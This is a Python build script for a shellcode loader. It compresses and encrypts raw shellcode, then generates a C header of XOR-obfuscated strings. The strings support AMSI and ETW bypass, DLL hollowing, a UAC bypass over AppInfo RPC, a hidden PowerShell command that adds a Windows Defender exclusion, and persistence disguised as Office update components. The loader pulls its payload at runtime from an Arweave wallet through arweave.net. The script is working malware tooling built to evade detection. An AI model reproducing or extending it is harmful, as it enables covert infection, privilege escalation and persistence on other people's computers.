#!/usr/bin/env python3
"""
Encrypt.py - Shellcode Encryption

Usage:
  python Encrypt.py <shellcode.bin>

Generates:
  data.enc  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode.
  key.txt   - Key fragment to pass to publish_arweave.py.
              Format: <32-hex-key>|<24-hex-nonce>|<original-size>|<compression-flag>

After running Encrypt.py:
  1. Run:  python arweave/publish_arweave.py data.enc key.txt wallet.json
     → uploads data.enc and meta JSON to Arweave, generates Payload.h
  2. Run:  build.bat
"""

import sys
import os
import re
import random
import struct


# -----------------------------------------------------------------------
# All obfuscated strings — 4-byte rotating XOR key, randomized each run.
# Key bytes are chosen so no XOR produces 0x00 at any character position,
# keeping the null terminator as a reliable DEOBF() sentinel in C.
# -----------------------------------------------------------------------
OBFUSCATED_STRINGS = {
    # Evasion.c
    "XSTR_NTDLL_DLL":               "ntdll.dll",
    "XSTR_ETW_EVENT_WRITE":         "EtwEventWrite",
    "XSTR_AMSI_DLL":                "amsi.dll",
    # Staging.c + Arweave.c (WinINet)
    "XSTR_WININET_DLL":             "wininet.dll",
    "XSTR_INTERNET_OPEN_A":         "InternetOpenA",
    "XSTR_INTERNET_CONNECT_A":      "InternetConnectA",
    "XSTR_HTTP_OPEN_REQUEST_A":     "HttpOpenRequestA",
    "XSTR_HTTP_SEND_REQUEST_A":     "HttpSendRequestA",
    "XSTR_INTERNET_READ_FILE":      "InternetReadFile",
    "XSTR_INTERNET_CLOSE_HANDLE":   "InternetCloseHandle",
    "XSTR_INTERNET_SET_OPTION_A":   "InternetSetOptionA",
    "XSTR_INTERNET_QUERY_OPTION_A": "InternetQueryOptionA",
    "XSTR_INTERNET_CRACK_URL_A":    "InternetCrackUrlA",
    "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "XSTR_HTTP_GET":                "GET",
    "XSTR_HTTP_QUERY_INFO_A":       "HttpQueryInfoA",
    # Arweave.c - network strings (obfuscated so they never appear in plaintext)
    "XSTR_ARWEAVE_HOST":            "arweave.net",
    "XSTR_ARWEAVE_GRAPHQL":         "/graphql",
    "XSTR_HTTP_POST":               "POST",
    "XSTR_JSON_CONTENT_TYPE":       "Content-Type: application/json",
    # Sacrificial DLL allowlist
    "XSTR_STOMP_DLL_1":             "xpsservices.dll",
    "XSTR_STOMP_DLL_2":             "mfreadwrite.dll",
    "XSTR_STOMP_DLL_3":             "dbgcore.dll",
    "XSTR_STOMP_DLL_4":             "mfsensorgroup.dll",
    # Evasion.c (patchless ETW via VEH + hardware breakpoints)
    "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
    "XSTR_RTL_REMOVE_VEH":          "RtlRemoveVectoredExceptionHandler",
    "XSTR_NT_CONTINUE":             "NtContinue",
    "XSTR_RTL_CAPTURE_CTX":         "RtlCaptureContext",
    # Stomper.c (phantom DLL hollowing via NTFS transactions)
    "XSTR_KTMW32_DLL":              "ktmw32.dll",
    "XSTR_CREATE_TRANSACTION":      "CreateTransaction",
    "XSTR_CREATE_FILE_TXA":         "CreateFileTransactedA",
    "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
    "XSTR_KERNEL32_DLL":            "kernel32.dll",
    "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
    "XSTR_GET_TEMP_PATH_A":         "GetTempPathA",
    "XSTR_COPY_FILE_A":             "CopyFileA",
    "XSTR_FIND_FIRST_FILE_A":       "FindFirstFileA",
    "XSTR_FIND_NEXT_FILE_A":        "FindNextFileA",
    "XSTR_FIND_CLOSE":              "FindClose",
    "XSTR_CREATE_FILE_A":           "CreateFileA",
    "XSTR_DLL_WILDCARD":            "*.dll",
    # Crypt.c (decompression via ntdll)
    "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
    # Evasion.c (DLL notification callback removal)
    "XSTR_LDR_REG_DLL_NOTIF":      "LdrRegisterDllNotification",
    "XSTR_LDR_UNREG_DLL_NOTIF":    "LdrUnregisterDllNotification",
    # Syscalls.c (clean ntdll via \KnownDlls\ntdll.dll section)
    "XSTR_KNOWNDLLS_NTDLL":        "\\KnownDlls\\ntdll.dll",
    # main.c (Poison Fiber kick-off)
    "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
    "XSTR_CREATE_FIBER":            "CreateFiber",
    "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
    # GhostHollow.c
    "XSTR_DELETE_FILE_A":           "DeleteFileA",
    # Uac.c (AppInfo RPC UAC bypass)
    "XSTR_NCALRPC":                 "ncalrpc",
    "XSTR_APPINFO_UUID":            "201ef99a-7fa0-444c-9399-19ba84f12a1a",
    "XSTR_WINSTA_DEFAULT":          "WinSta0\\Default",
    "XSTR_WINVER_EXE":              "\\winver.exe",
    "XSTR_COMPUTERDEFAULTS_EXE":    "\\ComputerDefaults.exe",
    # PowerShell WD-exclusion command pieces
    "XSTR_PS_EXE":                  "powershell.exe",
    "XSTR_WD_PS_FLAGS":             " -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '",
    "XSTR_WD_CMD_SUFFIX":           "'\"",
    # rpcrt4.dll RPC functions
    "XSTR_RPCRT4_DLL":              "rpcrt4.dll",
    "XSTR_RPC_STRING_BIND_COMP":    "RpcStringBindingComposeW",
    "XSTR_RPC_BIND_FROM_STR":       "RpcBindingFromStringBindingW",
    "XSTR_RPC_STRING_FREE":         "RpcStringFreeW",
    "XSTR_RPC_BIND_SET_AUTH":       "RpcBindingSetAuthInfoExW",
    "XSTR_RPC_ASYNC_INIT":          "RpcAsyncInitializeHandle",
    "XSTR_RPC_ASYNC_COMPLETE":      "RpcAsyncCompleteCall",
    "XSTR_RPC_BIND_FREE":           "RpcBindingFree",
    "XSTR_NDR_ASYNC_CALL":          "NdrAsyncClientCall",
    "XSTR_NDR_OLE_ALLOC":           "NdrOleAllocate",
    "XSTR_NDR_OLE_FREE":            "NdrOleFree",
    "XSTR_CREATE_WELL_KNOWN_SID":   "CreateWellKnownSid",
    # Install.c (first-run installer — UAC builds)
    "XSTR_APPDATA_VAR":             "APPDATA",
    "XSTR_INSTALL_SUBDIR":          "\\Microsoft\\Office\\Updates\\",
    "XSTR_PERSIST_EXE_NAME":        "msoia.exe",
    "XSTR_STARTUP_VALUE_NAME":      "Office Telemetry Agent",
    "XSTR_STARTUP_APPROVED_KEY":    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
    "XSTR_GET_ENV_VAR_A":           "GetEnvironmentVariableA",
    "XSTR_CREATE_DIRECTORY_A":      "CreateDirectoryA",
    "XSTR_SET_FILE_ATTR_A":         "SetFileAttributesA",
    # Registry functions
    "XSTR_REG_OPEN_KEY_EX_A":       "RegOpenKeyExA",
    "XSTR_REG_CREATE_KEY_EX_A":     "RegCreateKeyExA",
    "XSTR_REG_SET_VALUE_EX_A":      "RegSetValueExA",
    "XSTR_REG_CLOSE_KEY":           "RegCloseKey",
    # Persist.c + legacy
    "XSTR_ADVAPI32_DLL":            "advapi32.dll",
    "XSTR_WD_EXCL_PATH":            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
    "XSTR_RUN_KEY_PATH":            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "XSTR_PERSIST_NAME":            "OfficeUpdate",
}


# ---- Chaskey-12 Block Cipher (ARX, 128-bit) ----

def rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF


def chaskey_permute(v):
    for _ in range(12):
        v[0] = (v[0] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 5)
        v[1] ^= v[0]
        v[0] = rotl32(v[0], 16)
        v[2] = (v[2] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 8)
        v[3] ^= v[2]
        v[0] = (v[0] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 13)
        v[3] ^= v[0]
        v[2] = (v[2] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 7)
        v[1] ^= v[2]
        v[2] = rotl32(v[2], 16)
    return v


def chaskey_ctr_crypt(data, key_bytes, nonce_bytes):
    key   = list(struct.unpack('<4I', key_bytes))
    nonce = list(struct.unpack('<3I', nonce_bytes[:12]))
    result = bytearray()
    for blk in range((len(data) + 15) // 16):
        ctr = [nonce[0] ^ key[0], nonce[1] ^ key[1], nonce[2] ^ key[2], blk ^ key[3]]
        ctr = chaskey_permute(list(ctr))
        ctr[0] ^= key[0]; ctr[1] ^= key[1]; ctr[2] ^= key[2]; ctr[3] ^= key[3]
        keystream = struct.pack('<4I', *ctr)
        offset = blk * 16
        chunk  = data[offset:offset + 16]
        for i in range(len(chunk)):
            result.append(chunk[i] ^ keystream[i])
    return bytes(result)


# ---- LZNT1 Compression (via Windows ntdll) ----

def lznt1_compress(data):
    if sys.platform != 'win32':
        print("[!] LZNT1 compression requires Windows, skipping")
        return None
    import ctypes
    ntdll = ctypes.windll.ntdll
    COMPRESSION_FORMAT_LZNT1 = 0x0002
    COMPRESSION_ENGINE_STANDARD = 0x0000
    fmt = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD
    ws_size  = ctypes.c_ulong(0)
    fws_size = ctypes.c_ulong(0)
    status = ntdll.RtlGetCompressionWorkSpaceSize(fmt, ctypes.byref(ws_size), ctypes.byref(fws_size))
    if status != 0:
        print(f"[!] RtlGetCompressionWorkSpaceSize failed: 0x{status:08X}")
        return None
    workspace = ctypes.create_string_buffer(ws_size.value)
    out_size  = len(data) * 2 + 4096
    out_buf   = ctypes.create_string_buffer(out_size)
    final_size = ctypes.c_ulong(0)
    status = ntdll.RtlCompressBuffer(
        fmt, data, len(data), out_buf, out_size, 4096,
        ctypes.byref(final_size), workspace
    )
    if status != 0:
        print(f"[!] RtlCompressBuffer failed: 0x{status:08X}")
        return None
    return bytes(out_buf[:final_size.value])


# ---- String Obfuscation (4-byte rotating XOR key) ----

def pick_xor_keys(strings_dict):
    keys = []
    for pos in range(4):
        chars_at_pos = set()
        for s in strings_dict.values():
            data = s.encode('ascii')
            for i in range(pos, len(data), 4):
                chars_at_pos.add(data[i])
        valid = [k for k in range(1, 256) if k not in chars_at_pos]
        if not valid:
            raise ValueError(f"No valid XOR key for position {pos}")
        keys.append(random.choice(valid))
    return keys


def xor_encode_string(s, keys):
    encoded = []
    for i, b in enumerate(s.encode('ascii')):
        encoded.append((b ^ keys[i % 4]) & 0xFF)
    encoded.append(0x00)
    return encoded


def format_initializer(name, data, items_per_line=16):
    if len(data) <= items_per_line:
        vals = ", ".join(f"0x{b:02X}" for b in data)
        return f"#define {name} {{ {vals} }}"
    lines = [f"#define {name} {{ \\"]
    for i in range(0, len(data), items_per_line):
        chunk = data[i:i + items_per_line]
        vals  = ", ".join(f"0x{b:02X}" for b in chunk)
        if i + items_per_line < len(data):
            lines.append(f"    {vals}, \\")
        else:
            lines.append(f"    {vals} \\")
    lines.append("}")
    return "\n".join(lines)


_ARW_ADDR_RE = re.compile(r'^[A-Za-z0-9_-]{43}$')


def generate_payload_h(wallet_address: str, output_path: str) -> str:
    """
    Generate Payload.h embedding the Arweave wallet address (XOR-obfuscated).
    The loader queries arweave.net/graphql at runtime to find the latest
    transaction FROM this wallet and reads the meta JSON from it.

    Returns the content of Payload.h as a string.
    """
    xkeys = pick_xor_keys(OBFUSCATED_STRINGS)

    wallet_bytes    = wallet_address.encode('ascii') + b'\x00'
    wallet_xor_key  = random.randint(1, 255)
    wallet_byte_set = set(wallet_bytes[:-1])
    while wallet_xor_key in wallet_byte_set:
        wallet_xor_key = random.randint(1, 255)
    xored_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in wallet_bytes])

    placement_xor = bytes(random.randint(0, 255) for _ in range(16))

    lines = []
    lines.append("#pragma once")
    lines.append("")
    lines.append("// Auto-generated by Encrypt.py — do not edit")
    lines.append("// Randomized values change every build")
    lines.append("")
    lines.append("// ---- Fixed crypto constant ----")
    lines.append("#define KEY_SIZE        16")
    lines.append("// PAYLOAD_SIZE and USE_COMPRESSION are NOT compiled in.")
    lines.append("// They travel in the Arweave meta JSON so any future payload")
    lines.append("// works with the same binary without a rebuild.")
    lines.append("")
    lines.append("// ---- Arweave beacon ----")
    lines.append("// Wallet address whose recent transactions are scanned for the meta JSON.")
    lines.append("// The loader POSTs arweave.net/graphql with owners=[wallet] to find the")
    lines.append("// latest transaction FROM this wallet, then GETs its data for the JSON.")
    lines.append("// No URL, key, or TX ID is embedded in the binary.")
    lines.append(f"#define ARWEAVE_WALLET_XOR_KEY  0x{wallet_xor_key:02X}")
    lines.append(f"#define ARWEAVE_WALLET_LEN      {len(wallet_bytes)}")
    lines.append(format_initializer("INIT_ARWEAVE_WALLET", xored_wallet))
    lines.append("")
    lines.append("// ---- Per-build 16-byte write-encryption key ----")
    lines.append("// Phantom.c / GhostHollow.c XOR shellcode before writing to the")
    lines.append("// transacted / delete-on-close file (MpFilter sees garbage).")
    lines.append(format_initializer("INIT_PLACEMENT_XOR_KEY", placement_xor))
    lines.append("#define PLACEMENT_XOR_KEY_LEN 16")
    lines.append("")
    lines.append("// ---- 4-byte string obfuscation key (randomized per build) ----")
    for i, k in enumerate(xkeys):
        lines.append(f"#define XKEY_{i}          0x{k:02X}")
    lines.append("")
    lines.append("// ---- Obfuscated strings (4-byte rotating XOR, randomized per build) ----")
    for name, plaintext in OBFUSCATED_STRINGS.items():
        encoded = xor_encode_string(plaintext, xkeys)
        lines.append(format_initializer(name, encoded))
    lines.append("")

    content = "\n".join(lines) + "\n"
    with open(output_path, "w") as f:
        f.write(content)
    return content


def main():
    import argparse
    ap = argparse.ArgumentParser(description="Encrypt shellcode for zero-loader")
    ap.add_argument("shellcode", help="Path to raw shellcode .bin file")
    ap.add_argument("--wallet", metavar="ADDRESS",
                    help="Arweave wallet address (43-char base64url) — embeds address in Payload.h")
    args = ap.parse_args()

    shellcode_path = args.shellcode
    wallet_address = (args.wallet or "").strip()

    if wallet_address and not _ARW_ADDR_RE.match(wallet_address):
        print(f"[!] Invalid wallet address (must be 43-char base64url): {wallet_address}")
        sys.exit(1)

    out_name = "data.enc"

    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Shellcode: {len(shellcode)} bytes ({len(shellcode)/1024/1024:.2f} MB)")

    # --- LZNT1 Compression ---
    compressed = lznt1_compress(shellcode)
    if compressed and len(compressed) < len(shellcode):
        use_compression = True
        payload_data    = compressed
        print(f"[+] Compressed: {len(shellcode)} -> {len(compressed)} bytes "
              f"({len(compressed)*100//len(shellcode)}%)")
    else:
        use_compression = False
        payload_data    = shellcode
        if compressed:
            print(f"[*] Compression did not reduce size, skipping")
        else:
            print(f"[*] Compression unavailable, skipping")

    # --- Chaskey-CTR Encryption ---
    key_size      = 16
    chaskey_key   = bytes(random.randint(0, 255) for _ in range(key_size))
    chaskey_nonce = bytes(random.randint(0, 255) for _ in range(12))

    print(f"[*] Encrypting with Chaskey-CTR...")
    encrypted = chaskey_ctr_crypt(payload_data, chaskey_key, chaskey_nonce)

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Combined file: ASCII header + binary payload in one file.
    # Format: hex_key|hex_nonce|orig_size|compressed|<binary encrypted data>
    # The loader parses the header by scanning for 4 '|' chars, then reads
    # the rest as the encrypted payload — no separate meta TX needed.
    header = (
        f"{chaskey_key.hex()}"
        f"|{chaskey_nonce.hex()}"
        f"|{len(shellcode)}"
        f"|{1 if use_compression else 0}"
        f"|"
    ).encode("ascii")
    combined = header + encrypted

    enc_path = os.path.join(script_dir, out_name)
    with open(enc_path, "wb") as f:
        f.write(combined)
    print(f"[+] {out_name}: {len(combined)} bytes (header + encrypted payload)")

    # --- Verify encryption round-trip ---
    decrypted = chaskey_ctr_crypt(encrypted, chaskey_key, chaskey_nonce)
    assert decrypted == payload_data, "Decryption verification failed"
    print(f"[+] Encryption verification PASSED")
    # Verify combined file parses correctly
    assert combined[len(header):] == encrypted, "Combined file binary section mismatch"

    if use_compression:
        import ctypes
        ntdll     = ctypes.windll.ntdll
        out_buf   = ctypes.create_string_buffer(len(shellcode))
        final_sz  = ctypes.c_ulong(0)
        status    = ntdll.RtlDecompressBuffer(
            0x0002, out_buf, len(shellcode),
            payload_data, len(payload_data), ctypes.byref(final_sz)
        )
        assert status == 0 and final_sz.value == len(shellcode)
        assert bytes(out_buf[:final_sz.value]) == shellcode
        print(f"[+] Compression verification PASSED")

    # --- Generate Payload.h (when wallet address provided) ---
    if wallet_address:
        payload_h_path = os.path.join(script_dir, "Payload.h")
        generate_payload_h(wallet_address, payload_h_path)
        print(f"[+] Payload.h generated (wallet: {wallet_address[:8]}...)")
        print()
        print("=" * 60)
        print(f"[*] Wallet address embedded: {wallet_address}")
        print(f"[*] Next: upload data.enc to Arweave (single file — key is embedded)")
        print(f"    python arweave/publish_arweave.py data.enc wallet.json")
        print(f"[*] Then: build.bat")
        print("=" * 60)
    else:
        print()
        print("=" * 60)
        print(f"[*] No wallet provided — Payload.h NOT generated.")
        print(f"[*] Next: python arweave/publish_arweave.py data.enc wallet.json")
        print("=" * 60)


if __name__ == "__main__":
    main()
